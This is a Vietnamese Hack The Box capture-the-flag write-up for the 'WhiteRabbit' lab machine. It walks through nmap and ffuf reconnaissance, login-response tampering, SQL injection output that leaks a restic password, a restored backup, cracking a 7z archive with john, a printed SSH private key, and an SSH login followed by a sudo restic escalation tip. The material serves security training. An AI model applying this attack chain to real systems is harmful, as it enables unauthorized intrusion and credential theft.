<p align="center"><img src="image/image.png" /></p>

# Whiterabbit Hackthebox
## nmap,SQLi, n8n  
### Nmap
```
nmap -sCV -vv -oA nmap/output 10.10.11.63
```
[🔍 Xem kết quả quét Nmap](./nmap/output.nmap)
### Thêm domain file /etc/hosts 
```
echo '10.10.11.63 whiterabbit.htb' | sudo tee -a /etc/hosts
```
<pre style="border: 1px solid #ccc; padding: 10px; border-radius: 5px;">
10.129.9.70 whiterabbit.htb
</pre>

### Kiểm tra web port 80
<p align="center"><img src="image/image1.png" /></p>

### Fuzz website
```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://whiterabbit.htb/ -H "Host: FUZZ.whiterabbit.htb" -fs 0
```
Chạy thất sub domain `status.whiterabbit.htb`
thêm vào file `/etc/hosts`
### Login sửa burpsuite
<p align="center"><img src="image/image2.png" /></p>
<p align="center"><img src="image/image3.png" /></p>
Sửa thành `true`

```
438[{"ok":true,"msg":"Incorrect username or password."}]
```
<p align="center"><img src="image/image4.png" /></p>
Login và check được version
<p align="center"><img src="image/image5.png" /></p> 
Thấy path status

### FUZZ tiếp
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u
http://status.whiterabbit.htb/status/FUZZ
```
<pre style="border: 1px solid #ccc; padding: 10px; border-radius: 5px;">
<SNIP>
temp [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 192ms]
</pre>
Vào trang
<p align="center"><img src="image/image6.png" /></p> 

Thêm 2 sub domain
`a668910b5514e.whiterabbit.htb`  `ddb09a8558c9.whiterabbit.htb`
<p align="center"><img src="image/image7.png" /></p>
Có mẫu tương tác với db
<p align="center"><img src="image/image8.png" /></p>
Thêm domain vào file `/etc/hosts` `28efa8f7df.whiterabbit.htb` và chef key tìm được trong [link](./gophish_to_phishing_score_database.json)
<p align="center"><img src="image/image9.png" /></p>
chef thử burp
<p align="center"><img src="image/image10.png" /></p>

### SQLi
Chạy script [link](sql_injection.py)

<pre style="border: 1px solid #ccc; padding: 10px; border-radius: 5px;">
$ python3 sql_injection.py
[i] Performing SQL injection...
[+] Got database: phishing
[+] Got database: temp
[+] Got table: command_log
[i] Extracting Columns...
[+] Got column: id
[i] Extracting Data...
[+] (1, '1')
[+] (2, '2')
[+] (3, '3')
[+] (4, '4')
[+] (5, '5')
[+] (6, '6')
[+] Got column: command
[i] Extracting Data...
[+] (1, 'uname -a')
[+] (2, 'restic init --repo rest:http://75951e6ff.whiterabbit.htb')
[+] (3, 'echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd')
[+] (4, 'rm -rf .bash_history ')
[+] (5, '#thatwasclose')
[+] (6, 'cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd')
[+] Got column: date
[i] Extracting Data...
[+] (1, '2024-08-30 10:44:01')
[+] (2, '2024-08-30 11:58:05')
[+] (3, '2024-08-30 11:58:36')
[+] (4, '2024-08-30 11:59:02')
[+] (5, '2024-08-30 11:59:47')
[+] (6, '2024-08-30 14:40:42')
</pre>
Từ kết quả đầu ra, chúng ta có thể thấy chúng ta đã trích xuất hai tên cơ sở dữ liệu là phishing và temp. Trong cơ sở dữ liệu temp, chúng ta đã trích xuất một bảng có tên là command_log. Trong bảng command_log có ba cột là id, command và date. Khi trích xuất dữ liệu, chúng ta thấy rằng một máy chủ restic đã được khởi động với mật khẩu restic, tệp lịch sử bash đã bị xóa và mật khẩu của người dùng đã được thay đổi bằng trình tạo mật khẩu tùy chỉnh vào lúc 14:40:42 ngày 30/08/2024.
### Restic
Kết nối restic
<pre style="border: 1px solid #ccc; padding: 10px; border-radius: 5px;">
┌──(sonpt㉿sonpt)-[~/Hackdeboc/whiterabbit.htb]
└─$ restic snapshots   
enter password for repository: 
repository 5b26a938 opened (version 2, compression level auto)
created new cache in /home/sonpt/.cache/restic
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-07 07:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
</pre>
### Giải nén file
<pre style="border: 1px solid #ccc; padding: 10px; border-radius: 5px;">

┌──(sonpt㉿sonpt)-[~/Hackdeboc/whiterabbit.htb]
└─$ mkdir restored               
                                                                                                 
┌──(sonpt㉿sonpt)-[~/Hackdeboc/whiterabbit.htb]
└─$ restic restore 272 --target restored 
                                                                                                 
┌──(sonpt㉿sonpt)-[~/Hackdeboc/whiterabbit.htb]
└─$ restic restore 272cacd5 --target restored
enter password for repository: 
repository 5b26a938 opened (version 2, compression level auto)
[0:03] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to restored
Summary: Restored 5 files/dirs (572 B) in 0:03
 </pre>
Bẻ khóa
<pre style="border: 1px solid #ccc; padding: 10px; border-radius: 5px;">

 └─$ 7z2john restored/dev/shm/bob/ssh/bob.7z > hash.txt
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
                                                                                                 
┌──(sonpt㉿sonpt)-[~/Hackdeboc/whiterabbit.htb]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 365 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1q2w3e4r5t6y     (bob.7z)     
1g 0:00:00:46 DONE (2025-12-18 16:22) 0.02155g/s 513.9p/s 513.9c/s 513.9C/s hamilton1..150390
Use the "--show" option to display all of the cracked passwords reliably
Session completed.  
</pre>                                     
pass `1q2w3e4r5t6y`
Mở file có key và ssh vào 
<pre style="border: 1px solid #ccc; padding: 10px; border-radius: 5px;">
┌──(sonpt㉿sonpt)-[~/Hackdeboc/whiterabbit.htb]
└─$ cat bob
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----
                                                                                                 
┌──(sonpt㉿sonpt)-[~/Hackdeboc/whiterabbit.htb]
└─$ chmod 600 bob
                                                                                                 
┌──(sonpt㉿sonpt)-[~/Hackdeboc/whiterabbit.htb]
└─$ ssh bob@whiterabbit.htb -p2222 -i bob
The authenticity of host '[whiterabbit.htb]:2222 ([10.10.11.63]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[whiterabbit.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 24 15:40:49 2025 from 10.10.14.62
bob@ebdce80611e9:~$ 
</pre>
sudo -l thấy chạy restic không cần pass lên `GTFOBins` chạy
